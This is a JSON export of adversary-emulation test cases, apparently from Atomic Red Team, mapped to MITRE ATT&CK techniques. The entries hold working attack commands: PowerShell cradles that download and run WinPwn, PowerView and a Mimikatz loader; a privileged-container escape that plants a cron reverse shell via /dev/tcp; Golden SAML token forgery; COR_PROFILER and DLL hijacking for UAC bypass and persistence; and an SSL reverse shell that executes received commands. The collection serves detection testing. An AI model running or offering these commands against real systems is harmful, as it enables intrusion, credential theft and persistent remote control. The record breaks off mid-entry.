[{"data": {"name": "Plist Modification", "shortName": "T1647", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify MacOS plist file in one of two directories\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "1. Modify a .plist in\n\n    /Library/Preferences\n\n    OR\n\n    ~/Library/Preferences\n\n2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)\n", "successCriteria": null}], "techniqueIds": ["clacwm6bg03ag29mq06ho26ob"], "tags": []}, {"data": {"name": "WinPwn - Reflectively load Mimik@tz into memory", "shortName": "T1620", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm627031029mq3yggfznc"], "tags": []}, {"data": {"name": "AWS S3 Enumeration", "shortName": "T1619", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. \n\n\n**Supported Platforms:** iaas:azure\n\n"}, "executionSteps": [{"description": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done\n", "successCriteria": null}], "techniqueIds": ["clacwm6dd03cj29mq1jfadly5"], "tags": []}, {"data": {"name": "WinPwn - GPORemoteAccessPolicy", "shortName": "T1615", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPORemoteAccessPolicy -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm5t402s629mqgf8g4gqp"], "tags": []}, {"data": {"name": "WinPwn - GPOAudit", "shortName": "T1615", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5t402s629mqgf8g4gqp"], "tags": []}, {"data": {"name": "MSFT Get-GPO Cmdlet", "shortName": "T1615", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | gpo_output | The output of the Get-GPO cmdlet | String | $env:temp\\GPO_Output.txt | \n | gpo_param | You can specify a GPO by its display name or by its globally unique identifier (GUID) to get a single GPO, or you can get all the GPOs in the domain through the All parameter | string | -All | "}, "executionSteps": [{"description": "Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}", "successCriteria": null}], "techniqueIds": ["clacwm5t402s629mqgf8g4gqp"], "tags": []}, {"data": {"name": "Get-DomainGPO to display group policy information via PowerView", "shortName": "T1615", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"", "successCriteria": null}], "techniqueIds": ["clacwm5t402s629mqgf8g4gqp"], "tags": []}, {"data": {"name": "Display group policy information via gpresult", "shortName": "T1615", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "gpresult /z\n", "successCriteria": null}], "techniqueIds": ["clacwm5t402s629mqgf8g4gqp"], "tags": []}, {"data": {"name": "Discover System Language with chcp", "shortName": "T1614.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "chcp\n", "successCriteria": null}], "techniqueIds": ["clacwm6lp03lw29mq9ben8l2y"], "tags": []}, {"data": {"name": "Discover System Language by Registry Query", "shortName": "T1614.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\n", "successCriteria": null}], "techniqueIds": ["clacwm6lp03lw29mq9ben8l2y"], "tags": []}, {"data": {"name": "Mount host filesystem to escape privileged Docker container", "shortName": "T1611", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n\n\n**Supported Platforms:** containers\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | mount_device | Path to the device of the host's disk to mount | Path | /dev/dm-0 | \n | mount_point | Path where the host filesystem will be mounted | Path | /mnt/T1611.002 | \n | cron_path | Path on the host filesystem where cron jobs are stored | Path | /etc/cron.d | \n | cron_filename | Filename of the cron job in cron_path | String | T1611_002 | \n | listen_address | IP address to listen for callback from the host system. | String | `ifconfig eth0 | grep inet | awk '{print $2}'` | \n | listen_port | TCP Port to listen on for callback from the host system. | String | 4444 | "}, "executionSteps": [{"description": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'\" >> #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2>&1\n", "successCriteria": null}], "techniqueIds": ["clacwm629031229mq7e6jbpby"], "tags": []}, {"data": {"name": "Deploy container using nsenter container escape", "shortName": "T1611", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n\n\n**Supported Platforms:** containers\n\n"}, "executionSteps": [{"description": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n", "successCriteria": null}], "techniqueIds": ["clacwm629031229mq7e6jbpby"], "tags": []}, {"data": {"name": "ExecIntoContainer", "shortName": "T1609", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (\u201ckubectl exec\u201d). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using \u201ckubectl exec\u201d.\n\n\n**Supported Platforms:** containers\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | namespace | K8s namespace to use | String | default | \n | command | Command to run | String | uname | "}, "executionSteps": [{"description": "kubectl create -f src/busybox.yaml -n #{namespace}\nkubectl exec -n #{namespace} busybox -- #{command}\n", "successCriteria": null}], "techniqueIds": ["clacwm6b203a029mqgvcu76i3"], "tags": []}, {"data": {"name": "Golden SAML", "shortName": "T1606.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | certificate_path | Token signing certificate path. See T1552.004 to export it | Path | .\\ADFS_signing.pfx | \n | immutable_id | ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId | String | aehgdqBTZV50DKQZmNJ8mg== | \n | issuer_uri | Issuer URI of the ADFS service | String | http://contoso.com/adfs/services/trust/ | "}, "executionSteps": [{"description": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5uh02td29mqa31carmj"], "tags": []}, {"data": {"name": "Enumerate PlugNPlay Camera", "shortName": "T1592.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5v302u529mqhx67ho5h"], "tags": []}, {"data": {"name": "User scope COR_PROFILER", "shortName": "T1574.012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_name | unmanaged profiler DLL | Path | PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll | \n | clsid_guid | custom clsid guid | String | {09108e71-974c-4010-89cb-acf471ae9e2c} | "}, "executionSteps": [{"description": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\#{clsid_guid}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32\" -Value #{file_name} -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value #{file_name} -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n", "successCriteria": null}], "techniqueIds": ["clacwm6vx03wy29mq9fv8bqq8", "clacwm1fx004c29mq41w92uth"], "tags": []}, {"data": {"name": "System Scope COR_PROFILER", "shortName": "T1574.012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_name | unmanaged profiler DLL | Path | PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll | \n | clsid_guid | custom clsid guid | String | {09108e71-974c-4010-89cb-acf471ae9e2c} | "}, "executionSteps": [{"description": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value #{file_name} -Force | Out-Null\n", "successCriteria": null}], "techniqueIds": ["clacwm6vx03wy29mq9fv8bqq8", "clacwm1fx004c29mq41w92uth"], "tags": []}, {"data": {"name": "Registry-free process scope COR_PROFILER", "shortName": "T1574.012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_name | unamanged profiler DLL | Path | PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll | \n | clsid_guid | custom clsid guid | String | {09108e71-974c-4010-89cb-acf471ae9e2c} | "}, "executionSteps": [{"description": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '#{file_name}'\nPOWERSHELL -c 'Start-Sleep 1'\n", "successCriteria": null}], "techniqueIds": ["clacwm6vx03wy29mq9fv8bqq8", "clacwm1fx004c29mq41w92uth"], "tags": []}, {"data": {"name": "Service Registry Permissions Weakness", "shortName": "T1574.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | weak_service_name | weak service check | String | weakservicename | "}, "executionSteps": [{"description": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name} |FL\n", "successCriteria": null}], "techniqueIds": ["clacwm5sk02ri29mqbgg2hf4e", "clacwm2f600tp29mq4ehyg6z9"], "tags": []}, {"data": {"name": "Service ImagePath Change with reg.exe", "shortName": "T1574.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Change Service registry ImagePath of a bengin service to a malicious file\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | weak_service_name | weak service name | String | calcservice | \n | weak_service_path | weak service path | String | %windir%\\system32\\win32calc.exe | \n | malicious_service_path | malicious service path | String | %windir%\\system32\\cmd.exe | "}, "executionSteps": [{"description": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"#{malicious_service_path}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5sk02ri29mqbgg2hf4e", "clacwm2f600tp29mq4ehyg6z9"], "tags": []}, {"data": {"name": "Execution of program.exe as service with unquoted service path", "shortName": "T1574.009", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "When a service is created whose executable path contains spaces and isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | service_executable | Path of the executable used for the service and as the hijacked program.exe | Path | PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe | "}, "executionSteps": [{"description": "copy #{service_executable} \"C:\\Program Files\\windows_service.exe\"\ncopy #{service_executable} \"C:\\program.exe\"\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\nsc start \"Example Service\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6la03la29mqg2ww01un", "clacwm28q00nu29mqdkgl6zt4"], "tags": []}, {"data": {"name": "powerShell Persistence via hijacking default modules - Get-Variable.exe", "shortName": "T1574.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile\n", "successCriteria": null}], "techniqueIds": ["clacwm65i034029mqdrabhjim"], "tags": []}, {"data": {"name": "Shared Library Injection via LD_PRELOAD", "shortName": "T1574.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_shared_library_source | Path to a shared library source code | Path | PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c | \n | path_to_shared_library | Path to a shared library object | Path | /tmp/T1574006.so | "}, "executionSteps": [{"description": "LD_PRELOAD=#{path_to_shared_library} ls\n", "successCriteria": null}], "techniqueIds": ["clacwm66s035g29mqblt9adij", "clacwm1r400br29mq1taa6lmc"], "tags": []}, {"data": {"name": "Shared Library Injection via /etc/ld.so.preload", "shortName": "T1574.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. \n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_shared_library_source | Path to a shared library source code | Path | PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c | \n | path_to_shared_library | Path to a shared library object | Path | /tmp/T1574006.so | "}, "executionSteps": [{"description": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n", "successCriteria": null}], "techniqueIds": ["clacwm66s035g29mqblt9adij", "clacwm1r400br29mq1taa6lmc"], "tags": []}, {"data": {"name": "Dylib Injection via DYLD_INSERT_LIBRARIES", "shortName": "T1574.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "injects a dylib that opens calculator via env variable\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_inject | Path of executable to be injected. Mostly works on non-apple default apps. | Path | /Applications/Firefox.app/Contents/MacOS/firefox | \n | source_file | Path of c source file | Path | PathToAtomicsFolder/T1574.006/src/MacOS/T1574.006.c | \n | dylib_file | Path of dylib file | Path | /tmp/T1574006MOS.dylib | "}, "executionSteps": [{"description": "DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\n", "successCriteria": null}], "techniqueIds": ["clacwm66s035g29mqblt9adij"], "tags": []}, {"data": {"name": "DLL Side-Loading using the Notepad++ GUP.exe binary", "shortName": "T1574.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process_name | Name of the created process | String | calculator.exe | \n | gup_executable | GUP is an open source signed binary used by Notepad++ for software updates | Path | PathToAtomicsFolder\\T1574.002\\bin\\GUP.exe | "}, "executionSteps": [{"description": "#{gup_executable}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rb03sd29mqgd3a6gwo", "clacwm1l6007y29mqalyf3c3y"], "tags": []}, {"data": {"name": "DLL Side-Loading using the dotnet startup hook environment variable", "shortName": "T1574.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process_name | Name of the created process | String | calculator.exe | \n | preloader_dll | library for interfacing with the dotnet framework | Path | PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll | "}, "executionSteps": [{"description": "set DOTNET_STARTUP_HOOKS=#{preloader_dll}\ndotnet -h > nul\necho.\n", "successCriteria": null}], "techniqueIds": ["clacwm6rb03sd29mqgd3a6gwo"], "tags": []}, {"data": {"name": "DLL Search Order Hijacking - amsi.dll", "shortName": "T1574.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "successCriteria": null}], "techniqueIds": ["clacwm5xb02w629mqd0ju23rt", "clacwm1l2007u29mq00izh1ci"], "tags": []}, {"data": {"name": "OpenSSL C2", "shortName": "T1573", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | server_ip | IP of the external server | String | 127.0.0.1 | \n | server_port | The port to connect to on the external server | String | 443 | "}, "executionSteps": [{"description": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n", "successCriteria": null}], "techniqueIds": ["clacwm6jw03jz29mqc1615qfx", "clacwm1sd00ck29mq6lr87ggx"], "tags": []}, {"data": {"name": "DNS over HTTPS Regular Beaconing", "shortName": "T1572", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | doh_server | Default DoH resolver | String | https://8.8.8.8/resolve | \n | runtime | Time in minutes to run the simulation | Integer | 30 | \n | domain | Default domain to simulate against | String | 127.0.0.1.xip.io | \n | subdomain | Subdomain prepended to the domain name | String | atomicredteam | \n | query_type | DNS query type | String | TXT | \n | c2_interval | Seconds between C2 requests to the command and control server | Integer | 30 | \n | c2_jitter | Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests | Integer | 20 | "}, "executionSteps": [{"description": "Set-Location PathToAtomicsFolder\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "successCriteria": null}], "techniqueIds": ["clacwm639031x29mq4xbyhbbm"], "tags": []}, {"data": {"name": "DNS over HTTPS Long Domain Query", "shortName": "T1572", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | doh_server | Default DoH resolver | String | https://8.8.8.8/resolve | \n | query_type | DNS query type | String | TXT | \n | subdomain | Subdomain prepended to the domain name (should be 63 characters to test maximum length) | String | atomicredteamatomicredteamatomicredteamatomicredteamatomicredte | \n | domain | Default domain to simulate against | String | 127.0.0.1.xip.io | "}, "executionSteps": [{"description": "Set-Location PathToAtomicsFolder\n.\\T1572\\src\\T1572-doh-domain-length.ps1 